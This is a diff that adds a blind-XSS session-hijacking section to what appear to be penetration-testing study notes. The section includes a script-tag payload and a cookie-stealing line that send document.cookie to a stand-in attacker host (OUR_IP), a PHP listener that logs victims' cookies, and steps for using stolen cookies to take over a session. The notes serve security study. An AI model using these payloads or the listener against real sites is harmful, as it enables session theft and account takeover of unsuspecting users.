@@ -321,4 +321,82 @@ Although XSS is limited to browser execution, skilled attackers can escalate the
 - Share a malicious URL with the crafted XSS payload.
 - Once victims enter credentials, they are logged and stored on the attacker's server.
 
+---
 
+# Session Hijacking 
+
+#### Overview
+- **Definition**: Session hijacking exploits cookies to take over a user's active session without requiring credentials.
+- **Blind XSS**: Occurs when the XSS payload is executed on a page (e.g., Admin Panel) that attackers can't directly access.
+
+
+
+#### Blind XSS Detection
+1. **Examples of Vulnerable Forms**:
+   - Contact Forms
+   - Reviews
+   - Support Tickets
+   - HTTP User-Agent header
+2. **Steps**:
+   - Use XSS payloads that load a remote JavaScript file:
+     ```html
+     <script src="http://OUR_IP/field_name"></script>
+     ```
+   - Monitor incoming requests to your server using a listener (e.g., PHP or Netcat).
+   - Identify the vulnerable input field by observing the requests.
+
+
+
+#### Exploitation: Loading a Remote Script
+1. **JavaScript Cookie Stealing Payload**:
+   ```javascript
+   new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+   ```
+   - Payload sends the cookie data to the attacker's server.
+2. **XSS Payload**:
+   ```html
+   <script src="http://OUR_IP/script.js"></script>
+   ```
+   - Script hosted on the attacker's server.
+
+
+
+#### Preparing the Listener
+1. **Set up a PHP Listener**:
+   - Save the following PHP code as `index.php`:
+     ```php
+     <?php
+     if (isset($_GET['c'])) {
+         $list = explode(";", $_GET['c']);
+         foreach ($list as $key => $value) {
+             $cookie = urldecode($value);
+             $file = fopen("cookies.txt", "a+");
+             fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+             fclose($file);
+         }
+     }
+     ?>
+     ```
+   - Start the PHP server:
+     ```bash
+     sudo php -S 0.0.0.0:80
+     ```
+
+
+
+#### Execution
+1. **Payload Submission**:
+   - Inject the JavaScript payload into the vulnerable input field.
+   - Wait for the victim to trigger the payload.
+2. **Cookie Capture**:
+   - View captured cookies in `cookies.txt`:
+     ```bash
+     cat cookies.txt
+     ```
+3. **Using Stolen Cookies**:
+   - Navigate to the target site.
+   - Open Developer Tools (Shift + F9 in Firefox) → Storage.
+   - Add the stolen cookie (Name = part before `=`, Value = part after `=`).
+   - Refresh the page to gain victim access.
+
+---
